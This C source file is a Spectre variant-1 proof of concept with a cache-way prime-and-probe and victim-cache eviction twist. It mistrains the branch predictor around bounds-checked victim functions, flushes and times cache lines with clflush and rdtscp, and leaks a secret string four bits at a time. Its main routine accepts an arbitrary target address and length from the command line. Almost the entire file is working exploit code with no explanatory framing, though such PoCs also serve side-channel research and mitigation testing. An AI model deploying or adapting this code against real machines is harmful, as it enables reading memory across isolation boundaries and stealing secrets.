#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define DIST_BIT 8
#define DIST 256   // 64 * 4 for preventing prefetching
#define INDICES 16 // 16 * ways
#define WAY 8
#define LINE 64
#define SET 64

#define TRYTIMES 3
#define SIZEOFVC 8

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
//uint8_t unused1[64];
uint8_t array0[0xfa0] = {
    0x0,
    0x1,
    0x2,
    0x3,
    0x4,
    0x5,
    0x6,
    0x7,
    0x8,
    0x9,
    0xa,
    0xb,
    0xc,
    0xd,
    0xe,
    0xf};

uint8_t array1[0xf80] = {
    0x00,
    0x10,
    0x20,
    0x30,
    0x40,
    0x50,
    0x60,
    0x70,
    0x80,
    0x90,
    0xa0,
    0xb0,
    0xc0,
    0xd0,
    0xe0,
    0xf0};
//uint8_t unused2[64];
uint8_t array2[WAY * SET * LINE]; // for prime
uint8_t array3[WAY * SET * LINE]; // for eviction
uint8_t array4[WAY * SET * LINE]; // for 2nd eviction
//uint8_t unused3[64];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function1(size_t x)
{
  if (x < array1_size)
  {
    temp &= array3[array0[x] << DIST_BIT];
  }
}
void victim_function2(size_t x)
{
  if (x < array1_size)
  {
    temp &= array4[array0[x] << DIST_BIT];
  }
}

void victim_function3(size_t x)
{
  if (x < array1_size)
  {
    temp &= array3[(array1[x] >> 4) << DIST_BIT];
  }
}
void victim_function4(size_t x)
{
  if (x < array1_size)
  {
    temp &= array4[(array1[x] >> 4) << DIST_BIT];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD 80    /* assume cache hit if time <= threshold */
#define L1_CACHE_HIT_THRESHOLD 40 // for L1 Cache hit //

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
  static int results[INDICES];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  ///////////////////
  // for high 4bit //
  ///////////////////

  for (i = 0; i < INDICES; i++)
  {
    results[i] = 0;
  }

  for (tries = INDICES * TRYTIMES; tries > 0; tries--)
  {
    //printf("try %d\n",tries);
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < WAY; i++)
    {
      for (j = 0; j < INDICES; j++)
      {
        _mm_clflush(&array2[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
        _mm_clflush(&array3[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
        _mm_clflush(&array4[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
      }
    }

    // prime data over cache
    for (i = 0; i < WAY - 1; i++)
    {
      for (j = 0; j < INDICES; j++)
      {
        temp &= array2[(i * INDICES + j) * DIST];
      }
    }

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--)
    {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++)
      {
      } //* Delay (can also mfence) /

      //* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
      //* Avoid jumps in case those tip off the branch predictor /
      x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
      x = (x | (x >> 16));         //* Set x=-1 if j&6=0, else x=0 /
      x = training_x ^ (x & (malicious_x ^ training_x));

      //* Call the victim! /
      victim_function3(x);
    }
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--)
    {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++)
      {
      } //* Delay (can also mfence) /

      //* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
      //* Avoid jumps in case those tip off the branch predictor /
      x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
      x = (x | (x >> 16));         //* Set x=-1 if j&6=0, else x=0 /
      x = training_x ^ (x & (malicious_x ^ training_x));

      //* Call the victim! /
      victim_function4(x);
    }
    // Eviction from victim cache
    for(j=SIZEOFVC-1;j>0;j--){
      // x = (training_x+j) % array1_size;
      temp &= array3[((INDICES * j) + training_x) << DIST_BIT];
      temp &= array4[((INDICES * j) + training_x) << DIST_BIT];
      // victim_function3(x);
      // victim_function4(x);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < WAY - 7; i++)
    {
      for (j = 0; j < INDICES; j++)
      {
        addr = &array2[(i * INDICES + j) * DIST];
        time1 = __rdtscp(&junk);         /* READ TIMER */
        junk = *addr;                    /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

        ((int *)array2)[i * INDICES + j] = time2;
        /*if (time2 >= L1_CACHE_HIT_THRESHOLD && i != array1[tries % array1_size])
        		results[i % INDICES]++; //* cache miss - add +1 to score for this value */
      }
    }

    for (i = 0; i < WAY - 7; i++)
    {
      // printf("way %d\n",i);
      for (j = 0; j < INDICES; j++)
      {
        addr = &array2[(i * INDICES + j) * DIST];
        time2 = ((int *)array2)[i * INDICES + j];
        // printf("ind %02X, address %p, time %ld",j, addr, time2);
        if (time2 > L1_CACHE_HIT_THRESHOLD)
        {
          results[j]++;
          // printf(" miss");
        }
        else
        {
          // printf(" hit");
        }
        // printf("\n");
      }
    }
    /* Locate highest & second-highest results results tallies in j/k */
    j = -1;
    for (i = 0; i < INDICES; i++)
    {
      if (j < 0 || results[i] >= results[j])
      {
        j = i;
      }
    }
  }
  value[1] = (uint8_t)j;
  score[1] = results[j];

  //////////////////
  // for low 4bit //
  //////////////////

  // malicious_x = secret - array1 + array1 - array0
  malicious_x += (array1 - array0);

  for (i = 0; i < INDICES; i++)
  {
    results[i] = 0;
  }

  for (tries = INDICES * TRYTIMES; tries > 0; tries--)
  {
    //printf("try %d\n",tries);
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < WAY; i++)
    {
      for (j = 0; j < INDICES; j++)
      {
        _mm_clflush(&array2[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
        _mm_clflush(&array3[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
        _mm_clflush(&array4[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
      }
    }

    //printf("priming...\n");
    // prime data over cache
    for (i = 0; i < WAY - 1; i++)
    {
      for (j = 0; j < INDICES; j++)
      {
        temp &= array2[(i * INDICES + j) * DIST];
      }
    }

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--)
    {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++)
      {
      } //* Delay (can also mfence) /

      //* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
      //* Avoid jumps in case those tip off the branch predictor /
      x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
      x = (x | (x >> 16));         //* Set x=-1 if j&6=0, else x=0 /
      x = training_x ^ (x & (malicious_x ^ training_x));

      //* Call the victim! /
      victim_function1(x);
    }
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--)
    {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++)
      {
      } //* Delay (can also mfence) /

      //* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 /
      //* Avoid jumps in case those tip off the branch predictor /
      x = ((j % 6) - 1) & ~0xFFFF; //* Set x=FFF.FF0000 if j%6==0, else x=0 /
      x = (x | (x >> 16));         //* Set x=-1 if j&6=0, else x=0 /
      x = training_x ^ (x & (malicious_x ^ training_x));

      //* Call the victim! /
      victim_function2(x);
    }
    // Eviction from victim cache
    for(j=SIZEOFVC-1;j>0;j--){
      // x = (training_x+j) % array1_size;
      temp &= array3[((INDICES * j) + training_x) << DIST_BIT];
      temp &= array4[((INDICES * j) + training_x) << DIST_BIT];
      // victim_function3(x);
      // victim_function4(x);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < WAY - 7; i++)
    {
      for (j = 0; j < INDICES; j++)
      {
        addr = &array2[(i * INDICES + j) * DIST];
        time1 = __rdtscp(&junk);         /* READ TIMER */
        junk = *addr;                    /* MEMORY ACCESS TO TIME */
        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

        ((int *)array2)[i * INDICES + j] = time2;
        /*if (time2 >= L1_CACHE_HIT_THRESHOLD && i != array1[tries % array1_size])
        		results[i % INDICES]++; //* cache miss - add +1 to score for this value */
      }
    }

    for (i = 0; i < WAY - 7; i++)
    {
      //printf("way %d\n",i);
      for (j = 0; j < INDICES; j++)
      {
        addr = &array2[(i * INDICES + j) * DIST];
        time2 = ((int *)array2)[i * INDICES + j];
        //printf("ind %02X, address %p, time %ld",j, addr, time2);
        if (time2 > L1_CACHE_HIT_THRESHOLD)
        {
          results[j]++;
          //printf(" miss");
        }
        else
        {
          //printf(" hit");
        }
        //printf("\n");
      }
    }
    /* Locate highest & second-highest results results tallies in j/k */
    j = -1;
    for (i = 0; i < INDICES; i++)
    {
      if (j < 0 || results[i] >= results[j])
      {
        j = i;
      }
    }
  }
  value[0] = (uint8_t)j;
  score[0] = results[j];
}

int main(int argc,
         const char **argv)
{
  size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];

  for (i = 0; i < sizeof(array3); i++)
    array3[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  if (argc == 3)
  {
    sscanf(argv[1], "%p", (void **)(&malicious_x));
    malicious_x -= (size_t)array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", &len);
  }

  printf("%p,%p,%p\n", array2, array3, array4);
  printf("Reading %d bytes:\n", len);
  while (--len >= 0)
  {
    printf("Reading at malicious_x = %p... : %c, 0x%X\n", (void *)malicious_x, *(char *)(array1 + malicious_x), *(uint8_t *)(array1 + malicious_x));
    readMemoryByte(malicious_x++, value, score);
    printf("0x%02X=’%c’ score=%d,%d ", (value[1] << 4) + value[0], (value[1] << 4) + value[0], score[1], score[0]);
    printf("\n");
  }
  while (len++ < 40)
  {
    printf("%X", (*(secret + len)) % 16);
  }
  return (0);
}
